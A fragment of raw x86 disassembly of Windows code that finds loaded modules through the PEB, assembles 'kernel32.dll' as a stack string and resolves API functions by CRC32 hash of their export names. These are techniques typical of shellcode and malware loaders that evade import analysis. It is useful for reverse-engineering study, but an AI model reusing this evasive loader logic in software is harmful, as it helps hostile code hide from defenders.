  40189a:	52                   	push   %edx
  40189b:	ff 95 4c f6 ff ff    	call   *-0x9b4(%ebp)
  4018a1:	33 c0                	xor    %eax,%eax
  4018a3:	0f 85 50 f8 ff ff    	jne    0x4010f9
  4018a9:	c7 45 f8 cc cc cc cc 	movl   $0xcccccccc,-0x8(%ebp)
  4018b0:	e8 4b 05 00 00       	call   0x401e00
  4018b5:	8b 48 0c             	mov    0xc(%eax),%ecx
  4018b8:	8b 51 0c             	mov    0xc(%ecx),%edx
  4018bb:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4018be:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4018c1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4018c4:	03 48 18             	add    0x18(%eax),%ecx
  4018c7:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4018ca:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4018cd:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4018d0:	ff 55 fc             	call   *-0x4(%ebp)
  4018d3:	8b e5                	mov    %ebp,%esp
  4018d5:	5d                   	pop    %ebp
  4018d6:	c3                   	ret
  4018d7:	cc                   	int3
  4018d8:	cc                   	int3
  4018d9:	cc                   	int3
  4018da:	cc                   	int3
  4018db:	cc                   	int3
  4018dc:	cc                   	int3
  4018dd:	cc                   	int3
  4018de:	cc                   	int3
  4018df:	cc                   	int3
  4018e0:	55                   	push   %ebp
  4018e1:	8b ec                	mov    %esp,%ebp
  4018e3:	51                   	push   %ecx
  4018e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4018e7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4018ea:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4018ed:	8b 55 10             	mov    0x10(%ebp),%edx
  4018f0:	83 ea 01             	sub    $0x1,%edx
  4018f3:	89 55 10             	mov    %edx,0x10(%ebp)
  4018f6:	85 c9                	test   %ecx,%ecx
  4018f8:	76 13                	jbe    0x40190d
  4018fa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4018fd:	8a 4d 0c             	mov    0xc(%ebp),%cl
  401900:	88 08                	mov    %cl,(%eax)
  401902:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401905:	83 c2 01             	add    $0x1,%edx
  401908:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40190b:	eb dd                	jmp    0x4018ea
  40190d:	8b 45 08             	mov    0x8(%ebp),%eax
  401910:	8b e5                	mov    %ebp,%esp
  401912:	5d                   	pop    %ebp
  401913:	c3                   	ret
  401914:	cc                   	int3
  401915:	cc                   	int3
  401916:	cc                   	int3
  401917:	cc                   	int3
  401918:	cc                   	int3
  401919:	cc                   	int3
  40191a:	cc                   	int3
  40191b:	cc                   	int3
  40191c:	cc                   	int3
  40191d:	cc                   	int3
  40191e:	cc                   	int3
  40191f:	cc                   	int3
  401920:	55                   	push   %ebp
  401921:	8b ec                	mov    %esp,%ebp
  401923:	83 ec 18             	sub    $0x18,%esp
  401926:	8b 45 08             	mov    0x8(%ebp),%eax
  401929:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40192c:	c7 45 f8 ff ff ff ff 	movl   $0xffffffff,-0x8(%ebp)
  401933:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40193a:	eb 09                	jmp    0x401945
  40193c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40193f:	83 c1 01             	add    $0x1,%ecx
  401942:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401945:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401948:	3b 55 0c             	cmp    0xc(%ebp),%edx
  40194b:	73 6b                	jae    0x4019b8
  40194d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401950:	03 45 f4             	add    -0xc(%ebp),%eax
  401953:	0f b6 08             	movzbl (%eax),%ecx
  401956:	0f b6 55 f8          	movzbl -0x8(%ebp),%edx
  40195a:	33 ca                	xor    %edx,%ecx
  40195c:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40195f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401962:	c1 e8 08             	shr    $0x8,%eax
  401965:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401968:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40196f:	eb 09                	jmp    0x40197a
  401971:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401974:	83 c1 01             	add    $0x1,%ecx
  401977:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40197a:	83 7d ec 08          	cmpl   $0x8,-0x14(%ebp)
  40197e:	7d 2d                	jge    0x4019ad
  401980:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401983:	83 e2 01             	and    $0x1,%edx
  401986:	f7 da                	neg    %edx
  401988:	1b d2                	sbb    %edx,%edx
  40198a:	f7 da                	neg    %edx
  40198c:	88 55 eb             	mov    %dl,-0x15(%ebp)
  40198f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401992:	d1 e8                	shr    $1,%eax
  401994:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401997:	0f b6 4d eb          	movzbl -0x15(%ebp),%ecx
  40199b:	85 c9                	test   %ecx,%ecx
  40199d:	74 0c                	je     0x4019ab
  40199f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4019a2:	81 f2 20 83 b8 ed    	xor    $0xedb88320,%edx
  4019a8:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4019ab:	eb c4                	jmp    0x401971
  4019ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4019b0:	33 45 f0             	xor    -0x10(%ebp),%eax
  4019b3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4019b6:	eb 84                	jmp    0x40193c
  4019b8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4019bb:	f7 d0                	not    %eax
  4019bd:	8b e5                	mov    %ebp,%esp
  4019bf:	5d                   	pop    %ebp
  4019c0:	c3                   	ret
  4019c1:	cc                   	int3
  4019c2:	cc                   	int3
  4019c3:	cc                   	int3
  4019c4:	cc                   	int3
  4019c5:	cc                   	int3
  4019c6:	cc                   	int3
  4019c7:	cc                   	int3
  4019c8:	cc                   	int3
  4019c9:	cc                   	int3
  4019ca:	cc                   	int3
  4019cb:	cc                   	int3
  4019cc:	cc                   	int3
  4019cd:	cc                   	int3
  4019ce:	cc                   	int3
  4019cf:	cc                   	int3
  4019d0:	55                   	push   %ebp
  4019d1:	8b ec                	mov    %esp,%ebp
  4019d3:	83 ec 10             	sub    $0x10,%esp
  4019d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4019d9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4019dc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4019df:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4019e2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4019e5:	3b 55 f8             	cmp    -0x8(%ebp),%edx
  4019e8:	75 04                	jne    0x4019ee
  4019ea:	33 c0                	xor    %eax,%eax
  4019ec:	eb 7e                	jmp    0x401a6c
  4019ee:	b8 01 00 00 00       	mov    $0x1,%eax
  4019f3:	85 c0                	test   %eax,%eax
  4019f5:	74 73                	je     0x401a6a
  4019f7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4019fa:	66 8b 11             	mov    (%ecx),%dx
  4019fd:	66 89 55 fc          	mov    %dx,-0x4(%ebp)
  401a01:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401a04:	83 c0 02             	add    $0x2,%eax
  401a07:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401a0a:	0f b7 4d fc          	movzwl -0x4(%ebp),%ecx
  401a0e:	85 c9                	test   %ecx,%ecx
  401a10:	75 02                	jne    0x401a14
  401a12:	eb 56                	jmp    0x401a6a
  401a14:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401a17:	66 8b 02             	mov    (%edx),%ax
  401a1a:	66 89 45 f4          	mov    %ax,-0xc(%ebp)
  401a1e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401a21:	83 c1 02             	add    $0x2,%ecx
  401a24:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401a27:	0f b7 55 fc          	movzwl -0x4(%ebp),%edx
  401a2b:	0f b7 45 f4          	movzwl -0xc(%ebp),%eax
  401a2f:	3b d0                	cmp    %eax,%edx
  401a31:	74 35                	je     0x401a68
  401a33:	0f b7 4d fc          	movzwl -0x4(%ebp),%ecx
  401a37:	0f b7 55 f4          	movzwl -0xc(%ebp),%edx
  401a3b:	3b ca                	cmp    %edx,%ecx
  401a3d:	7d 13                	jge    0x401a52
  401a3f:	66 8b 45 f4          	mov    -0xc(%ebp),%ax
  401a43:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  401a47:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401a4a:	66 8b 51 fe          	mov    -0x2(%ecx),%dx
  401a4e:	66 89 55 f4          	mov    %dx,-0xc(%ebp)
  401a52:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  401a56:	0f b7 4d f4          	movzwl -0xc(%ebp),%ecx
  401a5a:	2b c1                	sub    %ecx,%eax
  401a5c:	83 f8 20             	cmp    $0x20,%eax
  401a5f:	74 07                	je     0x401a68
  401a61:	b8 01 00 00 00       	mov    $0x1,%eax
  401a66:	eb 04                	jmp    0x401a6c
  401a68:	eb 84                	jmp    0x4019ee
  401a6a:	33 c0                	xor    %eax,%eax
  401a6c:	8b e5                	mov    %ebp,%esp
  401a6e:	5d                   	pop    %ebp
  401a6f:	c3                   	ret
  401a70:	55                   	push   %ebp
  401a71:	8b ec                	mov    %esp,%ebp
  401a73:	51                   	push   %ecx
  401a74:	8b 45 08             	mov    0x8(%ebp),%eax
  401a77:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401a7a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401a7d:	0f be 11             	movsbl (%ecx),%edx
  401a80:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a83:	83 c0 01             	add    $0x1,%eax
  401a86:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401a89:	85 d2                	test   %edx,%edx
  401a8b:	74 08                	je     0x401a95
  401a8d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a90:	89 4d 08             	mov    %ecx,0x8(%ebp)
  401a93:	eb e5                	jmp    0x401a7a
  401a95:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a98:	2b 45 08             	sub    0x8(%ebp),%eax
  401a9b:	83 e8 01             	sub    $0x1,%eax
  401a9e:	8b e5                	mov    %ebp,%esp
  401aa0:	5d                   	pop    %ebp
  401aa1:	c3                   	ret
  401aa2:	cc                   	int3
  401aa3:	cc                   	int3
  401aa4:	cc                   	int3
  401aa5:	cc                   	int3
  401aa6:	cc                   	int3
  401aa7:	cc                   	int3
  401aa8:	cc                   	int3
  401aa9:	cc                   	int3
  401aaa:	cc                   	int3
  401aab:	cc                   	int3
  401aac:	cc                   	int3
  401aad:	cc                   	int3
  401aae:	cc                   	int3
  401aaf:	cc                   	int3
  401ab0:	55                   	push   %ebp
  401ab1:	8b ec                	mov    %esp,%ebp
  401ab3:	51                   	push   %ecx
  401ab4:	8b 45 08             	mov    0x8(%ebp),%eax
  401ab7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401aba:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401abd:	8b 55 10             	mov    0x10(%ebp),%edx
  401ac0:	83 ea 01             	sub    $0x1,%edx
  401ac3:	89 55 10             	mov    %edx,0x10(%ebp)
  401ac6:	85 c9                	test   %ecx,%ecx
  401ac8:	74 1e                	je     0x401ae8
  401aca:	8b 45 08             	mov    0x8(%ebp),%eax
  401acd:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401ad0:	8a 11                	mov    (%ecx),%dl
  401ad2:	88 10                	mov    %dl,(%eax)
  401ad4:	8b 45 08             	mov    0x8(%ebp),%eax
  401ad7:	83 c0 01             	add    $0x1,%eax
  401ada:	89 45 08             	mov    %eax,0x8(%ebp)
  401add:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401ae0:	83 c1 01             	add    $0x1,%ecx
  401ae3:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  401ae6:	eb d2                	jmp    0x401aba
  401ae8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401aeb:	8b e5                	mov    %ebp,%esp
  401aed:	5d                   	pop    %ebp
  401aee:	c3                   	ret
  401aef:	cc                   	int3
  401af0:	55                   	push   %ebp
  401af1:	8b ec                	mov    %esp,%ebp
  401af3:	8b 45 0c             	mov    0xc(%ebp),%eax
  401af6:	50                   	push   %eax
  401af7:	e8 74 ff ff ff       	call   0x401a70
  401afc:	83 c4 04             	add    $0x4,%esp
  401aff:	83 c0 01             	add    $0x1,%eax
  401b02:	50                   	push   %eax
  401b03:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401b06:	51                   	push   %ecx
  401b07:	8b 55 08             	mov    0x8(%ebp),%edx
  401b0a:	52                   	push   %edx
  401b0b:	e8 a0 ff ff ff       	call   0x401ab0
  401b10:	83 c4 0c             	add    $0xc,%esp
  401b13:	8b 45 08             	mov    0x8(%ebp),%eax
  401b16:	5d                   	pop    %ebp
  401b17:	c3                   	ret
  401b18:	cc                   	int3
  401b19:	cc                   	int3
  401b1a:	cc                   	int3
  401b1b:	cc                   	int3
  401b1c:	cc                   	int3
  401b1d:	cc                   	int3
  401b1e:	cc                   	int3
  401b1f:	cc                   	int3
  401b20:	55                   	push   %ebp
  401b21:	8b ec                	mov    %esp,%ebp
  401b23:	51                   	push   %ecx
  401b24:	8b 45 08             	mov    0x8(%ebp),%eax
  401b27:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b2a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b2d:	0f b7 11             	movzwl (%ecx),%edx
  401b30:	0f b7 45 0c          	movzwl 0xc(%ebp),%eax
  401b34:	3b d0                	cmp    %eax,%edx
  401b36:	75 02                	jne    0x401b3a
  401b38:	eb 13                	jmp    0x401b4d
  401b3a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b3d:	83 c1 02             	add    $0x2,%ecx
  401b40:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401b43:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401b46:	0f b7 02             	movzwl (%edx),%eax
  401b49:	85 c0                	test   %eax,%eax
  401b4b:	75 dd                	jne    0x401b2a
  401b4d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b50:	0f b7 01             	movzwl (%ecx),%eax
  401b53:	0f b7 55 0c          	movzwl 0xc(%ebp),%edx
  401b57:	2b c2                	sub    %edx,%eax
  401b59:	f7 d8                	neg    %eax
  401b5b:	1b c0                	sbb    %eax,%eax
  401b5d:	f7 d0                	not    %eax
  401b5f:	23 45 fc             	and    -0x4(%ebp),%eax
  401b62:	8b e5                	mov    %ebp,%esp
  401b64:	5d                   	pop    %ebp
  401b65:	c3                   	ret
  401b66:	cc                   	int3
  401b67:	cc                   	int3
  401b68:	cc                   	int3
  401b69:	cc                   	int3
  401b6a:	cc                   	int3
  401b6b:	cc                   	int3
  401b6c:	cc                   	int3
  401b6d:	cc                   	int3
  401b6e:	cc                   	int3
  401b6f:	cc                   	int3
  401b70:	55                   	push   %ebp
  401b71:	8b ec                	mov    %esp,%ebp
  401b73:	51                   	push   %ecx
  401b74:	8b 45 08             	mov    0x8(%ebp),%eax
  401b77:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b7a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b7d:	0f be 11             	movsbl (%ecx),%edx
  401b80:	0f be 45 0c          	movsbl 0xc(%ebp),%eax
  401b84:	3b d0                	cmp    %eax,%edx
  401b86:	75 02                	jne    0x401b8a
  401b88:	eb 13                	jmp    0x401b9d
  401b8a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b8d:	83 c1 01             	add    $0x1,%ecx
  401b90:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401b93:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401b96:	0f be 02             	movsbl (%edx),%eax
  401b99:	85 c0                	test   %eax,%eax
  401b9b:	75 dd                	jne    0x401b7a
  401b9d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401ba0:	0f be 01             	movsbl (%ecx),%eax
  401ba3:	0f be 55 0c          	movsbl 0xc(%ebp),%edx
  401ba7:	2b c2                	sub    %edx,%eax
  401ba9:	f7 d8                	neg    %eax
  401bab:	1b c0                	sbb    %eax,%eax
  401bad:	f7 d0                	not    %eax
  401baf:	23 45 fc             	and    -0x4(%ebp),%eax
  401bb2:	8b e5                	mov    %ebp,%esp
  401bb4:	5d                   	pop    %ebp
  401bb5:	c3                   	ret
  401bb6:	cc                   	int3
  401bb7:	cc                   	int3
  401bb8:	cc                   	int3
  401bb9:	cc                   	int3
  401bba:	cc                   	int3
  401bbb:	cc                   	int3
  401bbc:	cc                   	int3
  401bbd:	cc                   	int3
  401bbe:	cc                   	int3
  401bbf:	cc                   	int3
  401bc0:	55                   	push   %ebp
  401bc1:	8b ec                	mov    %esp,%ebp
  401bc3:	81 ec b4 00 00 00    	sub    $0xb4,%esp
  401bc9:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401bcd:	75 07                	jne    0x401bd6
  401bcf:	33 c0                	xor    %eax,%eax
  401bd1:	e9 1b 02 00 00       	jmp    0x401df1
  401bd6:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  401bdd:	8b 45 08             	mov    0x8(%ebp),%eax
  401be0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401be3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401be6:	0f b7 11             	movzwl (%ecx),%edx
  401be9:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
  401bef:	0f 85 f9 01 00 00    	jne    0x401dee
  401bf5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bf8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401bfb:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401bfe:	8b 51 3c             	mov    0x3c(%ecx),%edx
  401c01:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c04:	8d 4c 10 04          	lea    0x4(%eax,%edx,1),%ecx
  401c08:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401c0b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401c0e:	0f b7 02             	movzwl (%edx),%eax
  401c11:	3d 4c 01 00 00       	cmp    $0x14c,%eax
  401c16:	0f 85 d2 01 00 00    	jne    0x401dee
  401c1c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401c1f:	83 c1 14             	add    $0x14,%ecx
  401c22:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401c25:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401c28:	83 7a 60 00          	cmpl   $0x0,0x60(%edx)
  401c2c:	0f 84 bc 01 00 00    	je     0x401dee
  401c32:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401c35:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401c38:	03 48 60             	add    0x60(%eax),%ecx
  401c3b:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  401c3e:	c7 45 e4 ff ff ff ff 	movl   $0xffffffff,-0x1c(%ebp)
  401c45:	8b 55 0c             	mov    0xc(%ebp),%edx
  401c48:	c1 ea 10             	shr    $0x10,%edx
  401c4b:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  401c51:	0f b7 c2             	movzwl %dx,%eax
  401c54:	85 c0                	test   %eax,%eax
  401c56:	75 1a                	jne    0x401c72
  401c58:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401c5b:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  401c61:	0f b7 d1             	movzwl %cx,%edx
  401c64:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c67:	2b 50 10             	sub    0x10(%eax),%edx
  401c6a:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  401c6d:	e9 99 00 00 00       	jmp    0x401d0b
  401c72:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401c75:	83 e1 01             	and    $0x1,%ecx
  401c78:	74 08                	je     0x401c82
  401c7a:	8b 55 0c             	mov    0xc(%ebp),%edx
  401c7d:	89 55 e0             	mov    %edx,-0x20(%ebp)
  401c80:	eb 1c                	jmp    0x401c9e
  401c82:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c85:	50                   	push   %eax
  401c86:	e8 e5 fd ff ff       	call   0x401a70
  401c8b:	83 c4 04             	add    $0x4,%esp
  401c8e:	50                   	push   %eax
  401c8f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401c92:	51                   	push   %ecx
  401c93:	e8 88 fc ff ff       	call   0x401920
  401c98:	83 c4 08             	add    $0x8,%esp
  401c9b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401c9e:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  401ca5:	eb 09                	jmp    0x401cb0
  401ca7:	8b 55 dc             	mov    -0x24(%ebp),%edx
  401caa:	83 c2 01             	add    $0x1,%edx
  401cad:	89 55 dc             	mov    %edx,-0x24(%ebp)
  401cb0:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401cb3:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401cb6:	3b 48 18             	cmp    0x18(%eax),%ecx
  401cb9:	73 50                	jae    0x401d0b
  401cbb:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401cbe:	8b 42 20             	mov    0x20(%edx),%eax
  401cc1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401cc4:	8d 14 88             	lea    (%eax,%ecx,4),%edx
  401cc7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401cca:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401ccd:	03 0c 10             	add    (%eax,%edx,1),%ecx
  401cd0:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  401cd3:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401cd6:	52                   	push   %edx
  401cd7:	e8 94 fd ff ff       	call   0x401a70
  401cdc:	83 c4 04             	add    $0x4,%esp
  401cdf:	50                   	push   %eax
  401ce0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401ce3:	50                   	push   %eax
  401ce4:	e8 37 fc ff ff       	call   0x401920
  401ce9:	83 c4 08             	add    $0x8,%esp
  401cec:	39 45 e0             	cmp    %eax,-0x20(%ebp)
  401cef:	75 18                	jne    0x401d09
  401cf1:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401cf4:	8b 51 24             	mov    0x24(%ecx),%edx
  401cf7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401cfa:	8d 0c 42             	lea    (%edx,%eax,2),%ecx
  401cfd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401d00:	0f b7 04 0a          	movzwl (%edx,%ecx,1),%eax
  401d04:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401d07:	eb 02                	jmp    0x401d0b
  401d09:	eb 9c                	jmp    0x401ca7
  401d0b:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  401d0f:	74 1d                	je     0x401d2e
  401d11:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401d14:	8b 51 1c             	mov    0x1c(%ecx),%edx
  401d17:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401d1a:	8d 0c 82             	lea    (%edx,%eax,4),%ecx
  401d1d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401d20:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401d23:	03 04 0a             	add    (%edx,%ecx,1),%eax
  401d26:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  401d2c:	eb 0a                	jmp    0x401d38
  401d2e:	c7 85 4c ff ff ff 00 	movl   $0x0,-0xb4(%ebp)
  401d35:	00 00 00 
  401d38:	8b 8d 4c ff ff ff    	mov    -0xb4(%ebp),%ecx
  401d3e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401d41:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401d44:	3b 55 e8             	cmp    -0x18(%ebp),%edx
  401d47:	0f 82 a1 00 00 00    	jb     0x401dee
  401d4d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d50:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401d53:	03 48 64             	add    0x64(%eax),%ecx
  401d56:	39 4d f8             	cmp    %ecx,-0x8(%ebp)
  401d59:	0f 83 8f 00 00 00    	jae    0x401dee
  401d5f:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  401d63:	75 07                	jne    0x401d6c
  401d65:	33 c0                	xor    %eax,%eax
  401d67:	e9 85 00 00 00       	jmp    0x401df1
  401d6c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401d6f:	52                   	push   %edx
  401d70:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  401d76:	50                   	push   %eax
  401d77:	e8 74 fd ff ff       	call   0x401af0
  401d7c:	83 c4 08             	add    $0x8,%esp
  401d7f:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  401d86:	6a 2e                	push   $0x2e
  401d88:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  401d8e:	51                   	push   %ecx
  401d8f:	e8 dc fd ff ff       	call   0x401b70
  401d94:	83 c4 08             	add    $0x8,%esp
  401d97:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  401d9d:	83 bd 54 ff ff ff 00 	cmpl   $0x0,-0xac(%ebp)
  401da4:	74 48                	je     0x401dee
  401da6:	8b 95 54 ff ff ff    	mov    -0xac(%ebp),%edx
  401dac:	c6 02 00             	movb   $0x0,(%edx)
  401daf:	6a 00                	push   $0x0
  401db1:	6a 00                	push   $0x0
  401db3:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  401db9:	50                   	push   %eax
  401dba:	ff 55 14             	call   *0x14(%ebp)
  401dbd:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  401dc3:	83 bd 50 ff ff ff 00 	cmpl   $0x0,-0xb0(%ebp)
  401dca:	74 22                	je     0x401dee
  401dcc:	8b 4d 14             	mov    0x14(%ebp),%ecx
  401dcf:	51                   	push   %ecx
  401dd0:	6a 00                	push   $0x0
  401dd2:	8b 95 54 ff ff ff    	mov    -0xac(%ebp),%edx
  401dd8:	83 c2 01             	add    $0x1,%edx
  401ddb:	52                   	push   %edx
  401ddc:	8b 85 50 ff ff ff    	mov    -0xb0(%ebp),%eax
  401de2:	50                   	push   %eax
  401de3:	e8 d8 fd ff ff       	call   0x401bc0
  401de8:	83 c4 10             	add    $0x10,%esp
  401deb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401dee:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401df1:	8b e5                	mov    %ebp,%esp
  401df3:	5d                   	pop    %ebp
  401df4:	c3                   	ret
  401df5:	cc                   	int3
  401df6:	cc                   	int3
  401df7:	cc                   	int3
  401df8:	cc                   	int3
  401df9:	cc                   	int3
  401dfa:	cc                   	int3
  401dfb:	cc                   	int3
  401dfc:	cc                   	int3
  401dfd:	cc                   	int3
  401dfe:	cc                   	int3
  401dff:	cc                   	int3
  401e00:	55                   	push   %ebp
  401e01:	8b ec                	mov    %esp,%ebp
  401e03:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  401e09:	5d                   	pop    %ebp
  401e0a:	c3                   	ret
  401e0b:	cc                   	int3
  401e0c:	cc                   	int3
  401e0d:	cc                   	int3
  401e0e:	cc                   	int3
  401e0f:	cc                   	int3
  401e10:	55                   	push   %ebp
  401e11:	8b ec                	mov    %esp,%ebp
  401e13:	83 ec 28             	sub    $0x28,%esp
  401e16:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  401e1d:	e8 de ff ff ff       	call   0x401e00
  401e22:	8b 40 0c             	mov    0xc(%eax),%eax
  401e25:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401e28:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401e2b:	8b 51 0c             	mov    0xc(%ecx),%edx
  401e2e:	89 55 d8             	mov    %edx,-0x28(%ebp)
  401e31:	b8 6b 00 00 00       	mov    $0x6b,%eax
  401e36:	66 89 45 e4          	mov    %ax,-0x1c(%ebp)
  401e3a:	b9 65 00 00 00       	mov    $0x65,%ecx
  401e3f:	66 89 4d e6          	mov    %cx,-0x1a(%ebp)
  401e43:	ba 72 00 00 00       	mov    $0x72,%edx
  401e48:	66 89 55 e8          	mov    %dx,-0x18(%ebp)
  401e4c:	b8 6e 00 00 00       	mov    $0x6e,%eax
  401e51:	66 89 45 ea          	mov    %ax,-0x16(%ebp)
  401e55:	b9 65 00 00 00       	mov    $0x65,%ecx
  401e5a:	66 89 4d ec          	mov    %cx,-0x14(%ebp)
  401e5e:	ba 6c 00 00 00       	mov    $0x6c,%edx
  401e63:	66 89 55 ee          	mov    %dx,-0x12(%ebp)
  401e67:	b8 33 00 00 00       	mov    $0x33,%eax
  401e6c:	66 89 45 f0          	mov    %ax,-0x10(%ebp)
  401e70:	b9 32 00 00 00       	mov    $0x32,%ecx
  401e75:	66 89 4d f2          	mov    %cx,-0xe(%ebp)
  401e79:	ba 2e 00 00 00       	mov    $0x2e,%edx
  401e7e:	66 89 55 f4          	mov    %dx,-0xc(%ebp)
  401e82:	b8 64 00 00 00       	mov    $0x64,%eax
  401e87:	66 89 45 f6          	mov    %ax,-0xa(%ebp)
  401e8b:	b9 6c 00 00 00       	mov    $0x6c,%ecx
